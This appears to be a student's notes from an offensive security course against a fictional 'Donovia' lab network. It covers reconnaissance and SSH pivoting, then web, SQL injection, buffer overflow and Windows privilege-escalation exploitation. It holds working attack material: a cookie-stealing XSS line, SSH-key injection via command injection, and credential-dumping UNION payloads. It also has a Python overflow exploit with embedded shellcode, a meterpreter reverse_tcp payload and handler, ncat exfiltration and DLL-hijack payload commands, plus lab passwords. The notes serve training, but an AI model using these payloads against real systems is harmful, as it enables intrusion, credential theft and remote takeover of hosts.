##Security NOTES

Links: 
https://github.com/nmap/nmap/tree/master/scripts

windows op station ip: 10.50.38.32
linux op station ip: 10.50.21.11

##DAY 1 (Pen Testing)

http://10.50.20.250:8000

Login: 
THHU-505-M X312RSxndiF2sbo  Grey Host: 10.50.35.130

Most common pen testing will start with social networking and getting an inside source for pen testing.
ssh-keygen -f "/home/student/.ssh/known_hosts" -R "[127.0.0.1]:4190"
Data Collection:
    Web Data
    Sensitive Data
    Publicly Accessible
    Social Media
    Domain and IP Data

*Ping network then narrow down and nmap the hosts remaining
*ping sweep -> nmap -> banner grab

Script location:

/usr/share/nmap/scripts

Demo Notes:

ssh -MS /tmp/gray student@10.50.35.130 (anything that goes herewill go through your box)

ping sweep command:
for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &);done

(on lin-ops) ssh -S /tmp/gray gray -O forward -D 9050
(on lin-ops new tunnel goes through gray host)ssh -S /tmp/gray gray -O forward -L 41900:192.168.28.111:80
ssh -S /tmp/gray gray -O forward -L 41901:192.168.28.111:22

ssh -MS /tmp/comrade comrade@27.0.0.1 -p 41901

proxychains nmap -v -sT -Pn -T4 --script=http-enum.nse 192.168.28.111 -p 80

smb discovery

Scheme of Maneuver:
>Jump Box
->Network scan: 192.168.28.96/27
-->Network scan:192.168.150.224/27

Target Section:

Network scans:
Network: 192.168.28.96/27
Network:192.168.150.224/27
OSs: unknown
Creds: student ::
Known Ports: unknown
Known URL: consulting.site.donovia
Known URL: conference.site.donovia
Action: Reconnaissance to collect intelligence and identify possible avenues of approach in the network.

Temp Passes:

houseBeatFliesLOW
YourTempPassword

##DAY 2 Web Exploitation

HTTP Response Codes
    10X == Informational
    2XX == Success
    30X == Redirection
    4XX == Client Error
    5XX == Server Error
https://tools.ietf.org/html/rfc2616

HTTP Fields
    User-Agent
    Referer
    Cookie
    Date
    Server
    Set-Cookie
Demos:
nmap --script http-enum.nse 10.50.45.126 -p80
nikto -host 10.50.45.126

python3 -m http.server
<script>document.location="http://10.50.21.11:8000/"+document.cookie;</script>
<script>alert('hello')</script)

upload web shell to obtain access in the site

directory traversal take all the way back then take it forward (../../../../../../../<command path you want to go to)

checking for command injection consists of testing with a semi colon before a command.

gaining bash access:

ssh-keygen -t rsa -b 4096 (create keys)

(through web injection) echo "public key" > /var/www/.ssh/authorized_keys

ssh -i <id_rsa> www-data@10.50.45.126 (get in using their private key instead of adding your public key)

Master Socket
1. Create Master Socket to Jump / Gray Host
ssh -MS /tmp/gray student@10.50.#.#

1. Cancel Master Socket to Jump / Gray Host
ssh -MS /tmp/gray -O cancel student@10.50.#.#


Port Forward
1. Create Port forward through Master Socket to Next Hop/host
ssh -S /tmp/gray dummy -O forward -L 1330:192.168.28.#:80

1. Cancel Port forward through Master Socket to Next Hop/host
ssh -S /tmp/gray dummy -O cancel -L 1330:192.168.28.#:80 


Dynamic Forwarding
1. Create Port forward through Master Socket to Next Hop/host
ssh -S /tmp/gray dummy -O forward -D9050

1. Cancel Dynamic Tunnell
ssh -S /tmp/gray dummy -O cancel -D9050 (Cancel Dynamic tunnel)


##DAY 3 NOTES SQL INJECTION
Structured Query Language - ANSI Standard
Data bases broken up into tables and store information 

SQL COMMANDS:
    SELECT - Extracts data from a database
    UNION - Used to combine the result-set of two or more SELECT statements
    USE - Selects the DB to use

Demo Sql Web Exploit:
**put semi colon at the end of a command to end it

select * from session.car;
select * from car UNION select tireid,name,size,cost,1,2 from tires (1,2 used to pad out the columns) 
                                                                    such as looking at the individual database and fincing 
                                                                    one has less columns then the other when using UNION 
                                                                    you have to pad out extra columns.
-good practice to change number for each clumn to tell where they went.


SQL queries -
    unsanitized fields can be found using a single quote (')
        will return extraneous information
POST METHOD (sending data to server)
tom' OR 1='1
'tom' OR 1=1;
Looking at inspect source to gain info on crafting sql injection
when ran as php on site add ? to add anything onto it. (?username=tom'OR 1='1 & passwd=tom'OR 1='1) - will spit out passwords

Nesting Statements - 
    php?key=<value> UNION SELECT 1,column_name,3 from information_schema.columns where table_name = 'members'

union select <column> from <database>.<table> 

table.schema = list of database names 

table_name = list of table names

column_names = list of column names

POST METHOD:

Audi' UNION SELECT 1,2,3,4,5;#
Audi' UNION SELECT 1,2,3,table_schema,table_name from information_schema.tables; # (dumps all tables and their names)

Audi' UNION SELECT 1,2,3,table_schema,table_name from information_schema.columns; #(retrives database names table names and column names.)

Audi' UNION SELECT table_schema,2,table_name,column_name,5 from information_schema.columns WHERE table_schema='session'; # (Retrieves information about the database in use)

Audi' SELECT id,2,name,pass,5 from session.user;# (pull rom the exact columns you want)

#SQL Injection primary methods

GET Method (URL)

<URL>/uniondemo.php??username=tom'OR 1='1
<URL>/uniondemo.php?Selection=2 UNION SELECT 1,table_schema,table_name FROM information_schema.tables
<URL>/uniondemo.php?Selection=2 UNION SELECT table_name,1,column_name FROM information_schema.columnsa
<URL>/uniondemo.php?Selection=2 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns
<URL>/uniondemo.php?Selection=2 UNION SELECT null,name,color FROM car

POST Method (Form Input):

Audi' UNION SELECT 1,2,table_name,4,5 FROM information_schema.tables #
Audi' UNION SELECT 1,2,3,table_schema,table_name FROM information_schema.tables; #
Audi' UNION SELECT 1,2,table_schema,table_name,column_name FROM information_schema.columns; #     -- "Golden" statement
Audi' UNION SELECT 1,2,3,name,size FROM session.Tires; #
Audi' UNION SELECT @@version,database(),3,name,size FROM session.Tires; #

    Change the column name to a different spot, in order to see how you can manipulate the output from the SQL query.

GET METHOD:

php?Selection=2 UNION SELECT table_schema,table_name,3 FROM information_schema.tables;

php?Selection=2 UNION SELECT table_schema,table_name,column_name FROM information_schema.tables;

php?Selection=2 UNION SELECT id,pass,name from session.user;

INSERT INTO members (first_name, last_name, username, password, email, permission) VALUES ('Hacker', 'Hacker', '2', '2', '2', 3) 

Scheme of Maneuver:
>Jump Box
->T1:10.100.28.48

Target Section:

T1
Hostname: donovian-nla
IP: 10.100.28.48
OS: unknown
Creds:unknown
Last Known SSH Port: unknown
Last Known HTTP Port: 80
PSP: Unknown
Malware: Unknown
Action: Conduct approved SQLi Exploitation techniques to collect intelligence.


Boss	Sm7KhQHoZ1DGfONxnkyt	3.00
Maverick	turn&burn	3.00
phreak	pwd	3.00
Susan	flowers99	3.00
TW	imAPlaya	3.00
1-2-3-4	sayULuvM3	3.00
rich_kid	1M$	3.00
p0pStar	thrilla	3.00
Joe	vato	3.00


##DAY 4 REVERSE ENGINEERING

	

64 bit - RIP
32 bit - EIP
16 bit - IP

main:
mov rax, 16 (moving 16 into rax) 
push rax (push to stack)
jmp mem2 (jump to mem location)

mem2:
mov rax, 0 ( set value of 0 to rax)
ret (return)

mem2:
pop r8 (pops value off the stack (16) into r8) 
cmp rax, r8 (comparing rax to r8 if equal proceed))
je mem1 (jump to mem1 <jump equal>)

T1
Hostname: web.site.donovia
IP: 192.168.28.111
OS: unknown
Creds: comrade::StudentWebExploitPassword
Last Known SSH Port: unknown
PSP: Unknown
Malware: Unknown
Action: Extract approved binaries under directory titled "longTermStorage".

##PATCHING

patch selection 
change JNZ to JZ to swap if statement

##EXPLOIT DEVELOPMENT
Buffer Defenses:
Address Space Layout Randomization (ASLR)
Stack Canaries

Tools: IDA,Ghidra

GDB Commands: 

disass <FUNCTION>   #   Disassemble portion of the program
info <...>  #   Supply info for specific stack areas
x/256c $<REGISTER>  #   Read characters from specific register
break <address>  #   Establish a break point


##EXPLOIT DEVELOPMENT DEMO

gdb ./func
disass main
info functions
https://wiremask.eu/tools/buffer-overflow-pattern-generator/
run <<<$(echo "") (takes as user input) (find register offset) paste EIP to register value and find offset
run <<<$(./<script>)

env - gdb ./func (start without evirement variables)

crash it
info proc map
start after heap to end of stack (find)

find /b <start of address>, <end stack address>, 0xff, 0xe4 (look from start of satack to end and look for JP end ESP (ff for JP and e4 for ESP))
*in script*
0xf7de3b59 -> \x59\x3b\xde\xf7  JMP ESP (switch to big endian)


find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4 


#Making payload

msfconsole
use payload/linux/x86/exec
show options
set CMD 'whoami && ifconfig'
generate -b '\x00' -f python  (\x00 gets rid of null bytes)

or

msfvenom -p linux/x86/exec CMD='whoami && ifconfig' -b '\x00' -f python

SCRIPT

 #!/usr/bin/python2.7
  2 
  3 #Fill Buffer
  4 
  5 buf = "A" * 62
  6 
  7 #Overwrite EIP Register
  8 
  9 buf += "\x59\x3b\xde\xf7"
 10 
 11 
 12 #NOP SLED
 13 buf += "\x90" * 10
 14 
 15 #Payload
 16 
 17 buf += b"\xdb\xda\xb8\x0a\x9f\xcd\x7f\xd9\x74\x24\xf4\x5b"
 18 buf += b"\x31\xc9\xb1\x0e\x31\x43\x19\x83\xeb\xfc\x03\x43"
 19 buf += b"\x15\xe8\x6a\xa7\x74\xb4\x0d\x6a\xed\x2c\x03\xe8"
 20 buf += b"\x78\x4b\x33\xc1\x09\xfb\xc4\x75\xc1\x99\xad\xeb"
 21 buf += b"\x94\xbe\x7c\x1c\xb5\x40\x81\xdc\xcd\x28\xee\xbd"
 22 buf += b"\x5c\xc1\xd0\x1b\xb9\x31\x78\x02\xa6\x5e\x14\xac"
 23 buf += b"\x41\xc7\xe8\x67\xc1\x8e\x08\x4a\x65"
 24 
 25 print(buf)

T1
Hostname: Donovian_Webserver
IP: 192.168.28.111
OS: CentOS
Creds: comrade :: StudentWebExploitPassword
Last Known SSH Port: 2222
Action: Exploit binary.

T2
Hostname: Donovian-Terminal
IP: 192.168.28.105
OS: unknown
Creds: comrade :: StudentReconPassword
Last Known SSH Port: 2222

T3
Hostname: unknown
IP: 192.168.150.245
OS: unknown
Creds:unknown
Last Known SSH Port: unknown
PSP: Unknown
Malware: Unknown
Action: Exploit a network service on the machine

Scheme of Maneuver:
>Jump Box
->T1: 192.168.28.111
->T2: 192.168.28.105

>Jump Box
->donovian_grey_host
-->T3: 192.168.150.245

##WINDOWS EXPLOITATION

!mona modules
!mona jmp -r esp -m "essfunc.dll"
log data window
copy result and convert   big endian to little endian
copy to clipboard address
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.21.11 lport=4444 -b "\x00" -f python

OUTPUT:
buf += b"\xd9\xc2\xb8\x28\x86\xcd\x47\xd9\x74\x24\xf4\x5a"
buf += b"\x33\xc9\xb1\x59\x83\xea\xfc\x31\x42\x15\x03\x42"
buf += b"\x15\xca\x73\x31\xaf\x85\x7c\xca\x30\xf9\xf5\x2f"
buf += b"\x01\x2b\x61\x3b\x30\xfb\xe1\x69\xb9\x70\xa7\x99"
buf += b"\x4a\xf4\x60\xad\xfb\xb2\x56\x80\xfc\x73\x57\x4e"
buf += b"\x3e\x12\x2b\x8d\x13\xf4\x12\x5e\x66\xf5\x53\x28"
buf += b"\x0c\x1a\x09\xfc\x65\xb6\xbe\x89\x38\x0a\xbe\x5d"
buf += b"\x37\x32\xb8\xd8\x88\xc6\x74\xe2\xd8\x76\x0e\xbc"
buf += b"\xf8\x77\xc3\xb6\xb1\x6f\x66\x01\x35\xb3\x21\x19"
buf += b"\x82\x40\xb0\xcb\xda\xa9\x82\x33\xb0\x94\x2a\xbe"
buf += b"\xc8\xd1\x8d\x21\xbf\x29\xee\xdc\xb8\xea\x8c\x3a"
buf += b"\x4c\xec\x37\xc8\xf6\xc8\xc6\x1d\x60\x9b\xc5\xea"
buf += b"\xe6\xc3\xc9\xed\x2b\x78\xf5\x66\xca\xae\x7f\x3c"
buf += b"\xe9\x6a\xdb\xe6\x90\x2b\x81\x49\xac\x2b\x6d\x35"
buf += b"\x08\x20\x9c\x20\x2c\xc9\x5e\x4d\x70\x5d\x92\x80"
buf += b"\x8b\x9d\xbc\x93\xf8\xaf\x63\x08\x97\x83\xec\x96"
buf += b"\x60\x92\xfb\x28\xbe\x1c\x6b\xd7\x3f\x5c\xa5\x1c"
buf += b"\x6b\x0c\xdd\xb5\x14\xc7\x1d\x39\xc1\x7d\x14\xad"
buf += b"\xe0\xb3\x3d\x26\x9d\xb1\x3d\x29\x01\x3c\xdb\x19"
buf += b"\xe9\x6e\x74\xda\x59\xce\x24\xb2\xb3\xc1\x1b\xa2"
buf += b"\xbb\x08\x34\x49\x54\xe4\x6c\xe6\xcd\xad\xe7\x97"
buf += b"\x12\x78\x82\x98\x99\x88\x72\x56\x6a\xf9\x60\x8f"
buf += b"\x0d\x01\x79\x50\xb8\x01\x13\x54\x6a\x56\x8b\x56"
buf += b"\x4b\x90\x14\xa8\xbe\xa3\x53\x56\x3f\x95\x28\x61"
buf += b"\xd5\x99\x46\x8e\x39\x19\x97\xd8\x53\x19\xff\xbc"
buf += b"\x07\x4a\x1a\xc3\x9d\xff\xb7\x56\x1e\xa9\x64\xf0"
buf += b"\x76\x57\x52\x36\xd9\xa8\xb1\x44\x1e\x56\x47\x63"
buf += b"\x87\x3e\xb7\x33\x37\xbe\xdd\xb3\x67\xd6\x2a\x9b"
buf += b"\x88\x16\xd2\x36\xc1\x3e\x59\xd7\xa3\xdf\x5e\xf2"
buf += b"\x62\x41\x5e\xf1\xbe\x72\x25\x7a\x40\x73\xda\x92"
buf += b"\x25\x74\xda\x9a\x5b\x49\x0c\xa3\x29\x8c\x8c\x90"
buf += b"\x22\xbb\xb1\xb1\xa8\xc3\xe6\xc2\xf8"

-----

msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 0.0.0.0
set lport 4444

Shell Script:
#!/usr/bin/python2.7

import socket

'''
625011AF
625011BB
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.X.X lport=4444 -b "\x00" -f python
'''


buf = "TRUN /.:/" #Exploit
buf += "A" * 2003 #Buffer Offset
buf += "\xa0\x12\x50\x62"  #JMP ESP
buf += "\x90" * 15 #NOP SLED
buf += #SHELLCODE HERE
s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) # Creates IPv4 socket

s.connect(("0.0.0.0",PORTHERE))    #IP and port to connect to
print s.recv(1024)   #print response
s.send(buf)       #sends the variable buf
print s.recv(1024)   #print response
s.close()         #close the connection


##POST EXPLOITATION

/etc/hosts

Data Exfiltration
Session Transcript

 ssh <user>@<host> | tee

Obfuscation (Windows)

type <file> | %{$_ -replace 'a','b' -replace 'b','c' -replace 'c','d'} > translated.out
certutil -encode <file> encoded.b64

Obfuscation (Linux)

cat <file> | tr 'a-zA-Z0-9' 'b-zA-Z0-9a' > shifted.txt
cat <file>> | base64

Encrypted Transport

scp <source> <destination>
ncat --ssl <ip> <port> < <file>


find things already running :
cat /etc/crontab
/etc/hosts

crontab guru
crontab cheat sheet

##WINDOWS COMMANDS

dir /ah
find "string" <file you ant to find the string>
type demo_new.c | find /i "success"

Scheme of Maneuver:
>Jump Box
->T1: 192.168.28.100
-->T3:x.x.x.9

Target Section:

T1
Hostname: Donovian_Extranet
IP: 192.168.28.100
OS: CentOS
Creds:Unknown
Last Known SSH Port: 2222
PSP: none
Malware: none
Action: Perform SSH masquerade and survey system. Identify redirection to the next target.

T3
Hostname: unknowncat 
IP: 192.168.28.9/27
OS: unknown
Creds:unknown
Last Known SSH Port: unknown
PSP: Unknown
Malware: Unknown
Action: Gain access; survey host and map Donovian internal Cyberspace.

192.168.150.253 Donovian-Intranet

comrade::StudentMidwayPassword

##WINDOWS PRIVILEGE ESCALATION

Windows acces control model
Access Tokens
	security indetifier (SID)
Security Descriptors
	DACL
	SACL
	ACEs

DLL Search Order
	look in working directory first
	then registry for known dll's
	then get system directroy system32
	then windows directory last (longest)

Search order hijacking 
	(go in the order and see if you can put somwthing malicious in that current working directory.)

Windows Integrity Mechanism

Integrity Levels
Untrusted
	Anonymous SID access tokens
Low
	Everyone SID access token (World)
Medium
	Authenticated Users
High
	Administrators
System
	System services (LocalSystem, LocalService, NetworkService)

UAC 
	
AutoElevate Exeutables
	asinvoker
	highestavailable

Scheduled Tasks and Services
	schtasks /query /fo LIST /v

DLL Hijacking
	wmic service list full
	sc query

Covering tracks such as watching over logs
	
DEMO: Audit Logging
Show all audit category settings

auditpol /get /category:*

What does the below command show?

**auditpol /get /category:* | findstr /i "success failure"

Important Microsoft Event IDs

4624/4625
	Successful/failed login
4720
	Account created
4672
	Administrative user logged on
7045
	Service created

DEMO: Event Logging

Storage: c:\windows\system32\config\

File-Type: .evtx/.evt

wevtutil el

wmic ntevent where "logfile="<LOGNAME>" list full

Get-Eventlog -List

##Windows Privilege Exploitation DEMO

open task scheduler
	task shceduler library (take note of truggers and action)
look for dll hijacking or binary replacement
go to source of exe 
view hidden files and folders
view file name extensions
(check if you can write to directory to see what you can modify)
tasklist /svc | findstr "application"

Find a DLL to Hijack

download sysinternals
or sysmon or procexplorer
proc mon filters:
	filter
		proccess name contains "process name"
		path	      contains .dll
		Result        contains NAME NOT FOUND
Name not found means it looks for the dll but cannot find it

Creating a dll 
msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\DemoAdmin\Desktop\whoami.txt' -f dll > SSPICLI.dll
(if ou wanna replace the binary)
msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\DemoAdmin\Desktop\whoami.txt' -f exe > putty.exe
**if its ran through a scheduled task will be as system

Services
	lazy admin will make a service with no description
	go to the folder of the service and see if you can write there


Registry to find other programs that could be running on the startup of the computer
	find the application and change or dll hijack
HKLM windows current version run an run once and  fo HKCU as well.

Scheme of Maneuver:
>Jump Box
->Pivot: 192.168.28.105
-->T1: 192.168.28.5

Target Section:

Pivot
Hostname: ftp.site.donovia
IP: 192.168.28.105
OS: Ubuntu 18.04
Creds: comrade :: StudentReconPassword
Last Known SSH Port: 2222
Malware: none
Action: Perform SSH masquerade and redirect to the next target. No survey required, cohabitation with known PSP approved.

T1
Hostname: donovian-windows-private
IP: 192.168.28.5
OS: Windows ver: Unknown
Creds: comrade :: StudentPrivPassword
Last Known Ports: 3389
PSP: unknown
Malware: unknown
Action: Test supplied credentials, if possible gain access to host. Conduct host survey and gain privileged access.


xfreerdp /v:127.0.0.1:4191 /u:comrade /p:StudentPrivPassword /dynamic-resolution +clipboard +glyph-cache
























